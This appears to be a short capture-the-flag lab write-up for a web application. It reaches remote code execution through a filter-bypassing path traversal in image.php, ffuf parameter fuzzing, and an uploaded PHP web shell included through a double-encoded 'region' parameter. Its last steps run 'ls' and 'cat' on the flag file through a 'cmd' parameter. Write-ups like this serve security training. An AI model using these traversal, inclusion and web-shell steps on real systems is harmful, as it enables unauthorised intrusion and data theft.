### Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
![](Screenshot%202026-07-02%20at%2017.27.44.png)

```shell
curl http://154.57.164.80:30087/api/image.php?p=....//contact.php
```
![](Screenshot%202026-07-02%20at%2017.34.48.png)

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://154.57.164.80:30087/contact.php?FUZZ=value -fs 1771
```
![](Screenshot%202026-07-02%20at%2017.35.47.png)

![](Screenshot%202026-07-02%20at%2017.37.20.png)
![](Screenshot%202026-07-02%20at%2017.37.40.png)

![](Screenshot%202026-07-02%20at%2017.52.30.png)

```shell
md5sum shell.php | cut -d ' ' -f1
```
![](Screenshot%202026-07-02%20at%2017.53.40.png)
![](Screenshot%202026-07-02%20at%2017.56.58.png)

```url
http://154.57.164.80:30087/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=ls
```
![](Screenshot%202026-07-02%20at%2018.04.43.png)
![](Screenshot%202026-07-02%20at%2018.05.17.png)

```url
http://154.57.164.80:30087/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/flag_09ebca.txt
```
![](Screenshot%202026-07-02%20at%2018.05.38.png)
